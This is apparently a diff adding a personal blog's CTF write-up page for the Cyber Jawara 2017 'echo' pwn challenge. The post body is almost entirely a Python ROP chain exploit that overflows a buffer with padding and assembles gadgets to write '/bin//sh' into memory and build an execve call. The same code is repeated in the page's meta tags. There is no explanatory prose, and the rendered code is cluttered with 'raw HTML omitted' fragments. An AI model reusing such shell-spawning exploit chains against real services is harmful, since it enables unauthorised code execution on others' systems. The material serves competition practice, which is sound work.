@@ -1,0 +1,306 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+      <title>Cyber Jawara 2017 Final - echo (pwn 200) :: /home/rhama/ — Personal Blog</title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="description" content="fromstruct importpack
+# Padding goes herep =&#39;A&#39;*10008p &#43;=pack(&amp;rsquo;&amp;lt;Q&#39;, 0x0000000000401817) # pop rsi ; retp &#43;=pack(&amp;rsquo;&amp;lt;Q&#39;, 0x00000000006cb080) # @ .datap &#43;=pack(&amp;rsquo;&amp;lt;Q&#39;, 0x0000000000479ce6) # pop rax ; pop rdx ; pop rbx ; retp &#43;=&amp;rsquo;/bin//sh&#39;p &#43;=pack(&amp;rsquo;&amp;lt;Q&#39;, 0x4141414141414141) # paddingp &#43;=pack(&amp;rsquo;&amp;lt;Q&#39;, 0x4141414141414141) # paddingp &#43;=pack(&amp;rsquo;&amp;lt;Q&#39;, 0x00000000004755c1) # mov qword ptr [rsi], rax ; retp &#43;=pack(&amp;rsquo;&amp;lt;Q&#39;, 0x0000000000401817) # pop rsi ; retp &#43;=pack(&amp;rsquo;&amp;lt;Q&#39;, 0x00000000006cb088) # @ .data &#43; 8p &#43;=pack(&amp;rsquo;&amp;lt;Q&#39;, 0x000000000042695f) # xor rax, rax ; retp &#43;=pack(&amp;rsquo;&amp;lt;Q&#39;, 0x00000000004755c1) # mov qword ptr [rsi], rax ; retp &#43;=pack(&amp;rsquo;&amp;lt;Q&#39;, 0x00000000004005d5) # pop rdi ; retp &#43;=pack(&amp;rsquo;&amp;lt;Q&#39;, 0x00000000006cb080) # @ ."/>
+<meta name="keywords" content=""/>
+<meta name="robots" content="noodp"/>
+<link rel="canonical" href="rhamaa.github.io/post/2017-11-20-cyber-jawara-2017-final-pwn200/" />
+
+
+
+
+
+<link rel="stylesheet" href="rhamaa.github.io/assets/style.css">
+
+
+<link rel="stylesheet" href="rhamaa.github.io/style.css">
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="rhamaa.github.io/img/apple-touch-icon-144-precomposed.png">
+<link rel="shortcut icon" href="rhamaa.github.io/img/favicon.png">
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Cyber Jawara 2017 Final - echo (pwn 200)"/>
+<meta name="twitter:description" content="fromstruct importpack
+# Padding goes herep =&#39;A&#39;*10008p &#43;=pack(&rsquo;&lt;Q&#39;, 0x0000000000401817) # pop rsi ; retp &#43;=pack(&rsquo;&lt;Q&#39;, 0x00000000006cb080) # @ .datap &#43;=pack(&rsquo;&lt;Q&#39;, 0x0000000000479ce6) # pop rax ; pop rdx ; pop rbx ; retp &#43;=&rsquo;/bin//sh&#39;p &#43;=pack(&rsquo;&lt;Q&#39;, 0x4141414141414141) # paddingp &#43;=pack(&rsquo;&lt;Q&#39;, 0x4141414141414141) # paddingp &#43;=pack(&rsquo;&lt;Q&#39;, 0x00000000004755c1) # mov qword ptr [rsi], rax ; retp &#43;=pack(&rsquo;&lt;Q&#39;, 0x0000000000401817) # pop rsi ; retp &#43;=pack(&rsquo;&lt;Q&#39;, 0x00000000006cb088) # @ .data &#43; 8p &#43;=pack(&rsquo;&lt;Q&#39;, 0x000000000042695f) # xor rax, rax ; retp &#43;=pack(&rsquo;&lt;Q&#39;, 0x00000000004755c1) # mov qword ptr [rsi], rax ; retp &#43;=pack(&rsquo;&lt;Q&#39;, 0x00000000004005d5) # pop rdi ; retp &#43;=pack(&rsquo;&lt;Q&#39;, 0x00000000006cb080) # @ ."/>
+
+
+
+<meta property="og:title" content="Cyber Jawara 2017 Final - echo (pwn 200)" />
+<meta property="og:description" content="fromstruct importpack
+# Padding goes herep =&#39;A&#39;*10008p &#43;=pack(&rsquo;&lt;Q&#39;, 0x0000000000401817) # pop rsi ; retp &#43;=pack(&rsquo;&lt;Q&#39;, 0x00000000006cb080) # @ .datap &#43;=pack(&rsquo;&lt;Q&#39;, 0x0000000000479ce6) # pop rax ; pop rdx ; pop rbx ; retp &#43;=&rsquo;/bin//sh&#39;p &#43;=pack(&rsquo;&lt;Q&#39;, 0x4141414141414141) # paddingp &#43;=pack(&rsquo;&lt;Q&#39;, 0x4141414141414141) # paddingp &#43;=pack(&rsquo;&lt;Q&#39;, 0x00000000004755c1) # mov qword ptr [rsi], rax ; retp &#43;=pack(&rsquo;&lt;Q&#39;, 0x0000000000401817) # pop rsi ; retp &#43;=pack(&rsquo;&lt;Q&#39;, 0x00000000006cb088) # @ .data &#43; 8p &#43;=pack(&rsquo;&lt;Q&#39;, 0x000000000042695f) # xor rax, rax ; retp &#43;=pack(&rsquo;&lt;Q&#39;, 0x00000000004755c1) # mov qword ptr [rsi], rax ; retp &#43;=pack(&rsquo;&lt;Q&#39;, 0x00000000004005d5) # pop rdi ; retp &#43;=pack(&rsquo;&lt;Q&#39;, 0x00000000006cb080) # @ ." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="rhamaa.github.io/post/2017-11-20-cyber-jawara-2017-final-pwn200/" />
+<meta property="og:site_name" content="/home/rhama/" />
+
+
+
+
+
+
+  </head>
+  <body class="dark-theme">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a href="/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">ls</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="rhamaa.github.io/about">About</a></li>
+        
+      
+        
+          <li><a href="rhamaa.github.io/showcase">Showcase</a></li>
+        
+      
+      
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="rhamaa.github.io/about">About</a></li>
+      
+    
+      
+        <li><a href="rhamaa.github.io/showcase">Showcase</a></li>
+      
+    
+  </ul>
+</nav>
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none"/>
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+      <div class="content">
+        
+  
+  
+
+  <div class="post">
+    <h1 class="post-title"><a href="rhamaa.github.io/post/2017-11-20-cyber-jawara-2017-final-pwn200/">Cyber Jawara 2017 Final - echo (pwn 200)</a></h1>
+    <div class="post-meta">
+      
+
+      <span class="post-author">— Written by CTF.Ninja</span>
+      
+    </div>
+
+    
+      <span class="post-tags">
+        
+          #<a href="rhamaa.github.io/tags/cyberjawara2017/">CyberJawara2017</a>&nbsp;
+        
+          #<a href="rhamaa.github.io/tags/ctf/">CTF</a>&nbsp;
+        
+      </span>
+    
+
+    
+      
+        <img src="/assets/images/CTF.png" class="post-cover" />
+      
+    
+
+    <div class="post-content">
+      <!-- raw HTML omitted -->
+<p><!-- raw HTML omitted -->from<!-- raw HTML omitted --> struct <!-- raw HTML omitted -->import<!-- raw HTML omitted --> pack</p>
+<p><!-- raw HTML omitted --># Padding goes here<!-- raw HTML omitted -->
+p <!-- raw HTML omitted -->=<!-- raw HTML omitted --> <!-- raw HTML omitted -->'A'<!-- raw HTML omitted --> <!-- raw HTML omitted -->*<!-- raw HTML omitted --> <!-- raw HTML omitted -->10008<!-- raw HTML omitted --></p>
+<p>p <!-- raw HTML omitted -->+=<!-- raw HTML omitted --> pack(<!-- raw HTML omitted -->&rsquo;&lt;Q'<!-- raw HTML omitted -->, <!-- raw HTML omitted -->0x0000000000401817<!-- raw HTML omitted -->) <!-- raw HTML omitted --># pop rsi ; ret<!-- raw HTML omitted -->
+p <!-- raw HTML omitted -->+=<!-- raw HTML omitted --> pack(<!-- raw HTML omitted -->&rsquo;&lt;Q'<!-- raw HTML omitted -->, <!-- raw HTML omitted -->0x00000000006cb080<!-- raw HTML omitted -->) <!-- raw HTML omitted --># @ .data<!-- raw HTML omitted -->
+p <!-- raw HTML omitted -->+=<!-- raw HTML omitted --> pack(<!-- raw HTML omitted -->&rsquo;&lt;Q'<!-- raw HTML omitted -->, <!-- raw HTML omitted -->0x0000000000479ce6<!-- raw HTML omitted -->) <!-- raw HTML omitted --># pop rax ; pop rdx ; pop rbx ; ret<!-- raw HTML omitted -->
+p <!-- raw HTML omitted -->+=<!-- raw HTML omitted --> <!-- raw HTML omitted -->&rsquo;/bin//sh'<!-- raw HTML omitted -->
+p <!-- raw HTML omitted -->+=<!-- raw HTML omitted --> pack(<!-- raw HTML omitted -->&rsquo;&lt;Q'<!-- raw HTML omitted -->, <!-- raw HTML omitted -->0x4141414141414141<!-- raw HTML omitted -->) <!-- raw HTML omitted --># padding<!-- raw HTML omitted -->
+p <!-- raw HTML omitted -->+=<!-- raw HTML omitted --> pack(<!-- raw HTML omitted -->&rsquo;&lt;Q'<!-- raw HTML omitted -->, <!-- raw HTML omitted -->0x4141414141414141<!-- raw HTML omitted -->) <!-- raw HTML omitted --># padding<!-- raw HTML omitted -->
+p <!-- raw HTML omitted -->+=<!-- raw HTML omitted --> pack(<!-- raw HTML omitted -->&rsquo;&lt;Q'<!-- raw HTML omitted -->, <!-- raw HTML omitted -->0x00000000004755c1<!-- raw HTML omitted -->) <!-- raw HTML omitted --># mov qword ptr [rsi], rax ; ret<!-- raw HTML omitted -->
+p <!-- raw HTML omitted -->+=<!-- raw HTML omitted --> pack(<!-- raw HTML omitted -->&rsquo;&lt;Q'<!-- raw HTML omitted -->, <!-- raw HTML omitted -->0x0000000000401817<!-- raw HTML omitted -->) <!-- raw HTML omitted --># pop rsi ; ret<!-- raw HTML omitted -->
+p <!-- raw HTML omitted -->+=<!-- raw HTML omitted --> pack(<!-- raw HTML omitted -->&rsquo;&lt;Q'<!-- raw HTML omitted -->, <!-- raw HTML omitted -->0x00000000006cb088<!-- raw HTML omitted -->) <!-- raw HTML omitted --># @ .data + 8<!-- raw HTML omitted -->
+p <!-- raw HTML omitted -->+=<!-- raw HTML omitted --> pack(<!-- raw HTML omitted -->&rsquo;&lt;Q'<!-- raw HTML omitted -->, <!-- raw HTML omitted -->0x000000000042695f<!-- raw HTML omitted -->) <!-- raw HTML omitted --># xor rax, rax ; ret<!-- raw HTML omitted -->
+p <!-- raw HTML omitted -->+=<!-- raw HTML omitted --> pack(<!-- raw HTML omitted -->&rsquo;&lt;Q'<!-- raw HTML omitted -->, <!-- raw HTML omitted -->0x00000000004755c1<!-- raw HTML omitted -->) <!-- raw HTML omitted --># mov qword ptr [rsi], rax ; ret<!-- raw HTML omitted -->
+p <!-- raw HTML omitted -->+=<!-- raw HTML omitted --> pack(<!-- raw HTML omitted -->&rsquo;&lt;Q'<!-- raw HTML omitted -->, <!-- raw HTML omitted -->0x00000000004005d5<!-- raw HTML omitted -->) <!-- raw HTML omitted --># pop rdi ; ret<!-- raw HTML omitted -->
+p <!-- raw HTML omitted -->+=<!-- raw HTML omitted --> pack(<!-- raw HTML omitted -->&rsquo;&lt;Q'<!-- raw HTML omitted -->, <!-- raw HTML omitted -->0x00000000006cb080<!-- raw HTML omitted -->) <!-- raw HTML omitted --># @ .data<!-- raw HTML omitted -->
+p <!-- raw HTML omitted -->+=<!-- raw HTML omitted --> pack(<!-- raw HTML omitted -->&rsquo;&lt;Q'<!-- raw HTML omitted -->, <!-- raw HTML omitted -->0x0000000000401817<!-- raw HTML omitted -->) <!-- raw HTML omitted --># pop rsi ; ret<!-- raw HTML omitted -->
+p <!-- raw HTML omitted -->+=<!-- raw HTML omitted --> pack(<!-- raw HTML omitted -->&rsquo;&lt;Q'<!-- raw HTML omitted -->, <!-- raw HTML omitted -->0x00000000006cb088<!-- raw HTML omitted -->) <!-- raw HTML omitted --># @ .data + 8<!-- raw HTML omitted -->
+p <!-- raw HTML omitted -->+=<!-- raw HTML omitted --> pack(<!-- raw HTML omitted -->&rsquo;&lt;Q'<!-- raw HTML omitted -->, <!-- raw HTML omitted -->0x0000000000442d86<!-- raw HTML omitted -->) <!-- raw HTML omitted --># pop rdx ; ret<!-- raw HTML omitted -->
+p <!-- raw HTML omitted -->+=<!-- raw HTML omitted --> pack(<!-- raw HTML omitted -->&rsquo;&lt;Q'<!-- raw HTML omitted -->, <!-- raw HTML omitted -->0x00000000006cb088<!-- raw HTML omitted -->) <!-- raw HTML omitted --># @ .data + 8<!-- raw HTML omitted -->
+p <!-- raw HTML omitted -->+=<!-- raw HTML omitted --> pack(<!-- raw HTML omitted -->&rsquo;&lt;Q'<!-- raw HTML omitted -->, <!-- raw HTML omitted -->0x000000000042695f<!-- raw HTML omitted -->) <!-- raw HTML omitted --># xor rax, rax ; ret<!-- raw HTML omitted -->
+p <!-- raw HTML omitted -->+=<!-- raw HTML omitted --> pack(<!-- raw HTML omitted -->&rsquo;&lt;Q'<!-- raw HTML omitted -->, <!-- raw HTML omitted -->0x0000000000467920<!-- raw HTML omitted -->) <!-- raw HTML omitted --># add rax, 1 ; ret<!-- raw HTML omitted -->
+p <!-- raw HTML omitted -->+=<!-- raw HTML omitted --> pack(<!-- raw HTML omitted -->&rsquo;&lt;Q'<!-- raw HTML omitted -->, <!-- raw HTML omitted -->0x0000000000467920<!-- raw HTML omitted -->) <!-- raw HTML omitted --># add rax, 1 ; ret<!-- raw HTML omitted -->
+p <!-- raw HTML omitted -->+=<!-- raw HTML omitted --> pack(<!-- raw HTML omitted -->&rsquo;&lt;Q'<!-- raw HTML omitted -->, <!-- raw HTML omitted -->0x0000000000467920<!-- raw HTML omitted -->) <!-- raw HTML omitted --># add rax, 1 ; ret<!-- raw HTML omitted -->
+p <!-- raw HTML omitted -->+=<!-- raw HTML omitted --> pack(<!-- raw HTML omitted -->&rsquo;&lt;Q'<!-- raw HTML omitted -->, <!-- raw HTML omitted -->0x0000000000467920<!-- raw HTML omitted -->) <!-- raw HTML omitted --># add rax, 1 ; ret<!-- raw HTML omitted -->
+p <!-- raw HTML omitted -->+=<!-- raw HTML omitted --> pack(<!-- raw HTML omitted -->&rsquo;&lt;Q'<!-- raw HTML omitted -->, <!-- raw HTML omitted -->0x0000000000467920<!-- raw HTML omitted -->) <!-- raw HTML omitted --># add rax, 1 ; ret<!-- raw HTML omitted -->
+p <!-- raw HTML omitted -->+=<!-- raw HTML omitted --> pack(<!-- raw HTML omitted -->&rsquo;&lt;Q'<!-- raw HTML omitted -->, <!-- raw HTML omitted -->0x0000000000467920<!-- raw HTML omitted -->) <!-- raw HTML omitted --># add rax, 1 ; ret<!-- raw HTML omitted -->
+p <!-- raw HTML omitted -->+=<!-- raw HTML omitted --> pack(<!-- raw HTML omitted -->&rsquo;&lt;Q'<!-- raw HTML omitted -->, <!-- raw HTML omitted -->0x0000000000467920<!-- raw HTML omitted -->) <!-- raw HTML omitted --># add rax, 1 ; ret<!-- raw HTML omitted -->
+p <!-- raw HTML omitted -->+=<!-- raw HTML omitted --> pack(<!-- raw HTML omitted -->&rsquo;&lt;Q'<!-- raw HTML omitted -->, <!-- raw HTML omitted -->0x0000000000467920<!-- raw HTML omitted -->) <!-- raw HTML omitted --># add rax, 1 ; ret<!-- raw HTML omitted -->
+p <!-- raw HTML omitted -->+=<!-- raw HTML omitted --> pack(<!-- raw HTML omitted -->&rsquo;&lt;Q'<!-- raw HTML omitted -->, <!-- raw HTML omitted -->0x0000000000467920<!-- raw HTML omitted -->) <!-- raw HTML omitted --># add rax, 1 ; ret<!-- raw HTML omitted -->
+p <!-- raw HTML omitted -->+=<!-- raw HTML omitted --> pack(<!-- raw HTML omitted -->&rsquo;&lt;Q'<!-- raw HTML omitted -->, <!-- raw HTML omitted -->0x0000000000467920<!-- raw HTML omitted -->) <!-- raw HTML omitted --># add rax, 1 ; ret<!-- raw HTML omitted -->
+p <!-- raw HTML omitted -->+=<!-- raw HTML omitted --> pack(<!-- raw HTML omitted -->&rsquo;&lt;Q'<!-- raw HTML omitted -->, <!-- raw HTML omitted -->0x0000000000467920<!-- raw HTML omitted -->) <!-- raw HTML omitted --># add rax, 1 ; ret<!-- raw HTML omitted -->
+p <!-- raw HTML omitted -->+=<!-- raw HTML omitted --> pack(<!-- raw HTML omitted -->&rsquo;&lt;Q'<!-- raw HTML omitted -->, <!-- raw HTML omitted -->0x0000000000467920<!-- raw HTML omitted -->) <!-- raw HTML omitted --># add rax, 1 ; ret<!-- raw HTML omitted -->
+p <!-- raw HTML omitted -->+=<!-- raw HTML omitted --> pack(<!-- raw HTML omitted -->&rsquo;&lt;Q'<!-- raw HTML omitted -->, <!-- raw HTML omitted -->0x0000000000467920<!-- raw HTML omitted -->) <!-- raw HTML omitted --># add rax, 1 ; ret<!-- raw HTML omitted -->
+p <!-- raw HTML omitted -->+=<!-- raw HTML omitted --> pack(<!-- raw HTML omitted -->&rsquo;&lt;Q'<!-- raw HTML omitted -->, <!-- raw HTML omitted -->0x0000000000467920<!-- raw HTML omitted -->) <!-- raw HTML omitted --># add rax, 1 ; ret<!-- raw HTML omitted -->
+p <!-- raw HTML omitted -->+=<!-- raw HTML omitted --> pack(<!-- raw HTML omitted -->&rsquo;&lt;Q'<!-- raw HTML omitted -->, <!-- raw HTML omitted -->0x0000000000467920<!-- raw HTML omitted -->) <!-- raw HTML omitted --># add rax, 1 ; ret<!-- raw HTML omitted -->
+p <!-- raw HTML omitted -->+=<!-- raw HTML omitted --> pack(<!-- raw HTML omitted -->&rsquo;&lt;Q'<!-- raw HTML omitted -->, <!-- raw HTML omitted -->0x0000000000467920<!-- raw HTML omitted -->) <!-- raw HTML omitted --># add rax, 1 ; ret<!-- raw HTML omitted -->
+p <!-- raw HTML omitted -->+=<!-- raw HTML omitted --> pack(<!-- raw HTML omitted -->&rsquo;&lt;Q'<!-- raw HTML omitted -->, <!-- raw HTML omitted -->0x0000000000467920<!-- raw HTML omitted -->) <!-- raw HTML omitted --># add rax, 1 ; ret<!-- raw HTML omitted -->
+p <!-- raw HTML omitted -->+=<!-- raw HTML omitted --> pack(<!-- raw HTML omitted -->&rsquo;&lt;Q'<!-- raw HTML omitted -->, <!-- raw HTML omitted -->0x0000000000467920<!-- raw HTML omitted -->) <!-- raw HTML omitted --># add rax, 1 ; ret<!-- raw HTML omitted -->
+p <!-- raw HTML omitted -->+=<!-- raw HTML omitted --> pack(<!-- raw HTML omitted -->&rsquo;&lt;Q'<!-- raw HTML omitted -->, <!-- raw HTML omitted -->0x0000000000467920<!-- raw HTML omitted -->) <!-- raw HTML omitted --># add rax, 1 ; ret<!-- raw HTML omitted -->
+p <!-- raw HTML omitted -->+=<!-- raw HTML omitted --> pack(<!-- raw HTML omitted -->&rsquo;&lt;Q'<!-- raw HTML omitted -->, <!-- raw HTML omitted -->0x0000000000467920<!-- raw HTML omitted -->) <!-- raw HTML omitted --># add rax, 1 ; ret<!-- raw HTML omitted -->
+p <!-- raw HTML omitted -->+=<!-- raw HTML omitted --> pack(<!-- raw HTML omitted -->&rsquo;&lt;Q'<!-- raw HTML omitted -->, <!-- raw HTML omitted -->0x0000000000467920<!-- raw HTML omitted -->) <!-- raw HTML omitted --># add rax, 1 ; ret<!-- raw HTML omitted -->
+p <!-- raw HTML omitted -->+=<!-- raw HTML omitted --> pack(<!-- raw HTML omitted -->&rsquo;&lt;Q'<!-- raw HTML omitted -->, <!-- raw HTML omitted -->0x0000000000467920<!-- raw HTML omitted -->) <!-- raw HTML omitted --># add rax, 1 ; ret<!-- raw HTML omitted -->
+p <!-- raw HTML omitted -->+=<!-- raw HTML omitted --> pack(<!-- raw HTML omitted -->&rsquo;&lt;Q'<!-- raw HTML omitted -->, <!-- raw HTML omitted -->0x0000000000467920<!-- raw HTML omitted -->) <!-- raw HTML omitted --># add rax, 1 ; ret<!-- raw HTML omitted -->
+p <!-- raw HTML omitted -->+=<!-- raw HTML omitted --> pack(<!-- raw HTML omitted -->&rsquo;&lt;Q'<!-- raw HTML omitted -->, <!-- raw HTML omitted -->0x0000000000467920<!-- raw HTML omitted -->) <!-- raw HTML omitted --># add rax, 1 ; ret<!-- raw HTML omitted -->
+p <!-- raw HTML omitted -->+=<!-- raw HTML omitted --> pack(<!-- raw HTML omitted -->&rsquo;&lt;Q'<!-- raw HTML omitted -->, <!-- raw HTML omitted -->0x0000000000467920<!-- raw HTML omitted -->) <!-- raw HTML omitted --># add rax, 1 ; ret<!-- raw HTML omitted -->
+p <!-- raw HTML omitted -->+=<!-- raw HTML omitted --> pack(<!-- raw HTML omitted -->&rsquo;&lt;Q'<!-- raw HTML omitted -->, <!-- raw HTML omitted -->0x0000000000467920<!-- raw HTML omitted -->) <!-- raw HTML omitted --># add rax, 1 ; ret<!-- raw HTML omitted -->
+p <!-- raw HTML omitted -->+=<!-- raw HTML omitted --> pack(<!-- raw HTML omitted -->&rsquo;&lt;Q'<!-- raw HTML omitted -->, <!-- raw HTML omitted -->0x0000000000467920<!-- raw HTML omitted -->) <!-- raw HTML omitted --># add rax, 1 ; ret<!-- raw HTML omitted -->
+p <!-- raw HTML omitted -->+=<!-- raw HTML omitted --> pack(<!-- raw HTML omitted -->&rsquo;&lt;Q'<!-- raw HTML omitted -->, <!-- raw HTML omitted -->0x0000000000467920<!-- raw HTML omitted -->) <!-- raw HTML omitted --># add rax, 1 ; ret<!-- raw HTML omitted -->
+p <!-- raw HTML omitted -->+=<!-- raw HTML omitted --> pack(<!-- raw HTML omitted -->&rsquo;&lt;Q'<!-- raw HTML omitted -->, <!-- raw HTML omitted -->0x0000000000467920<!-- raw HTML omitted -->) <!-- raw HTML omitted --># add rax, 1 ; ret<!-- raw HTML omitted -->
+p <!-- raw HTML omitted -->+=<!-- raw HTML omitted --> pack(<!-- raw HTML omitted -->&rsquo;&lt;Q'<!-- raw HTML omitted -->, <!-- raw HTML omitted -->0x0000000000467920<!-- raw HTML omitted -->) <!-- raw HTML omitted --># add rax, 1 ; ret<!-- raw HTML omitted -->
+p <!-- raw HTML omitted -->+=<!-- raw HTML omitted --> pack(<!-- raw HTML omitted -->&rsquo;&lt;Q'<!-- raw HTML omitted -->, <!-- raw HTML omitted -->0x0000000000467920<!-- raw HTML omitted -->) <!-- raw HTML omitted --># add rax, 1 ; ret<!-- raw HTML omitted -->
+p <!-- raw HTML omitted -->+=<!-- raw HTML omitted --> pack(<!-- raw HTML omitted -->&rsquo;&lt;Q'<!-- raw HTML omitted -->, <!-- raw HTML omitted -->0x0000000000467920<!-- raw HTML omitted -->) <!-- raw HTML omitted --># add rax, 1 ; ret<!-- raw HTML omitted -->
+p <!-- raw HTML omitted -->+=<!-- raw HTML omitted --> pack(<!-- raw HTML omitted -->&rsquo;&lt;Q'<!-- raw HTML omitted -->, <!-- raw HTML omitted -->0x0000000000467920<!-- raw HTML omitted -->) <!-- raw HTML omitted --># add rax, 1 ; ret<!-- raw HTML omitted -->
+p <!-- raw HTML omitted -->+=<!-- raw HTML omitted --> pack(<!-- raw HTML omitted -->&rsquo;&lt;Q'<!-- raw HTML omitted -->, <!-- raw HTML omitted -->0x0000000000467920<!-- raw HTML omitted -->) <!-- raw HTML omitted --># add rax, 1 ; ret<!-- raw HTML omitted -->
+p <!-- raw HTML omitted -->+=<!-- raw HTML omitted --> pack(<!-- raw HTML omitted -->&rsquo;&lt;Q'<!-- raw HTML omitted -->, <!-- raw HTML omitted -->0x0000000000467920<!-- raw HTML omitted -->) <!-- raw HTML omitted --># add rax, 1 ; ret<!-- raw HTML omitted -->
+p <!-- raw HTML omitted -->+=<!-- raw HTML omitted --> pack(<!-- raw HTML omitted -->&rsquo;&lt;Q'<!-- raw HTML omitted -->, <!-- raw HTML omitted -->0x0000000000467920<!-- raw HTML omitted -->) <!-- raw HTML omitted --># add rax, 1 ; ret<!-- raw HTML omitted -->
+p <!-- raw HTML omitted -->+=<!-- raw HTML omitted --> pack(<!-- raw HTML omitted -->&rsquo;&lt;Q'<!-- raw HTML omitted -->, <!-- raw HTML omitted -->0x0000000000467920<!-- raw HTML omitted -->) <!-- raw HTML omitted --># add rax, 1 ; ret<!-- raw HTML omitted -->
+p <!-- raw HTML omitted -->+=<!-- raw HTML omitted --> pack(<!-- raw HTML omitted -->&rsquo;&lt;Q'<!-- raw HTML omitted -->, <!-- raw HTML omitted -->0x0000000000467920<!-- raw HTML omitted -->) <!-- raw HTML omitted --># add rax, 1 ; ret<!-- raw HTML omitted -->
+p <!-- raw HTML omitted -->+=<!-- raw HTML omitted --> pack(<!-- raw HTML omitted -->&rsquo;&lt;Q'<!-- raw HTML omitted -->, <!-- raw HTML omitted -->0x0000000000467920<!-- raw HTML omitted -->) <!-- raw HTML omitted --># add rax, 1 ; ret<!-- raw HTML omitted -->
+p <!-- raw HTML omitted -->+=<!-- raw HTML omitted --> pack(<!-- raw HTML omitted -->&rsquo;&lt;Q'<!-- raw HTML omitted -->, <!-- raw HTML omitted -->0x0000000000467920<!-- raw HTML omitted -->) <!-- raw HTML omitted --># add rax, 1 ; ret<!-- raw HTML omitted -->
+p <!-- raw HTML omitted -->+=<!-- raw HTML omitted --> pack(<!-- raw HTML omitted -->&rsquo;&lt;Q'<!-- raw HTML omitted -->, <!-- raw HTML omitted -->0x0000000000467920<!-- raw HTML omitted -->) <!-- raw HTML omitted --># add rax, 1 ; ret<!-- raw HTML omitted -->
+p <!-- raw HTML omitted -->+=<!-- raw HTML omitted --> pack(<!-- raw HTML omitted -->&rsquo;&lt;Q'<!-- raw HTML omitted -->, <!-- raw HTML omitted -->0x0000000000467920<!-- raw HTML omitted -->) <!-- raw HTML omitted --># add rax, 1 ; ret<!-- raw HTML omitted -->
+p <!-- raw HTML omitted -->+=<!-- raw HTML omitted --> pack(<!-- raw HTML omitted -->&rsquo;&lt;Q'<!-- raw HTML omitted -->, <!-- raw HTML omitted -->0x0000000000467920<!-- raw HTML omitted -->) <!-- raw HTML omitted --># add rax, 1 ; ret<!-- raw HTML omitted -->
+p <!-- raw HTML omitted -->+=<!-- raw HTML omitted --> pack(<!-- raw HTML omitted -->&rsquo;&lt;Q'<!-- raw HTML omitted -->, <!-- raw HTML omitted -->0x0000000000467920<!-- raw HTML omitted -->) <!-- raw HTML omitted --># add rax, 1 ; ret<!-- raw HTML omitted -->
+p <!-- raw HTML omitted -->+=<!-- raw HTML omitted --> pack(<!-- raw HTML omitted -->&rsquo;&lt;Q'<!-- raw HTML omitted -->, <!-- raw HTML omitted -->0x0000000000467920<!-- raw HTML omitted -->) <!-- raw HTML omitted --># add rax, 1 ; ret<!-- raw HTML omitted -->
+p <!-- raw HTML omitted -->+=<!-- raw HTML omitted --> pack(<!-- raw HTML omitted -->&rsquo;&lt;Q'<!-- raw HTML omitted -->, <!-- raw HTML omitted -->0x0000000000467920<!-- raw HTML omitted -->) <!-- raw HTML omitted --># add rax, 1 ; ret<!-- raw HTML omitted -->
+p <!-- raw HTML omitted -->+=<!-- raw HTML omitted --> pack(<!-- raw HTML omitted -->&rsquo;&lt;Q'<!-- raw HTML omitted -->, <!-- raw HTML omitted -->0x0000000000467920<!-- raw HTML omitted -->) <!-- raw HTML omitted --># add rax, 1 ; ret<!-- raw HTML omitted -->
+p <!-- raw HTML omitted -->+=<!-- raw HTML omitted --> pack(<!-- raw HTML omitted -->&rsquo;&lt;Q'<!-- raw HTML omitted -->, <!-- raw HTML omitted -->0x0000000000467920<!-- raw HTML omitted -->) <!-- raw HTML omitted --># add rax, 1 ; ret<!-- raw HTML omitted -->
+p <!-- raw HTML omitted -->+=<!-- raw HTML omitted --> pack(<!-- raw HTML omitted -->&rsquo;&lt;Q'<!-- raw HTML omitted -->, <!-- raw HTML omitted -->0x0000000000467920<!-- raw HTML omitted -->) <!-- raw HTML omitted --># add rax, 1 ; ret<!-- raw HTML omitted -->
+p <!-- raw HTML omitted -->+=<!-- raw HTML omitted --> pack(<!-- raw HTML omitted -->&rsquo;&lt;Q'<!-- raw HTML omitted -->, <!-- raw HTML omitted -->0x0000000000467920<!-- raw HTML omitted -->) <!-- raw HTML omitted --># add rax, 1 ; ret<!-- raw HTML omitted -->
+p <!-- raw HTML omitted -->+=<!-- raw HTML omitted --> pack(<!-- raw HTML omitted -->&rsquo;&lt;Q'<!-- raw HTML omitted -->, <!-- raw HTML omitted -->0x0000000000467920<!-- raw HTML omitted -->) <!-- raw HTML omitted --># add rax, 1 ; ret<!-- raw HTML omitted -->
+p <!-- raw HTML omitted -->+=<!-- raw HTML omitted --> pack(<!-- raw HTML omitted -->&rsquo;&lt;Q'<!-- raw HTML omitted -->, <!-- raw HTML omitted -->0x0000000000467920<!-- raw HTML omitted -->) <!-- raw HTML omitted --># add rax, 1 ; ret<!-- raw HTML omitted -->
+p <!-- raw HTML omitted -->+=<!-- raw HTML omitted --> pack(<!-- raw HTML omitted -->&rsquo;&lt;Q'<!-- raw HTML omitted -->, <!-- raw HTML omitted -->0x0000000000467920<!-- raw HTML omitted -->) <!-- raw HTML omitted --># add rax, 1 ; ret<!-- raw HTML omitted -->
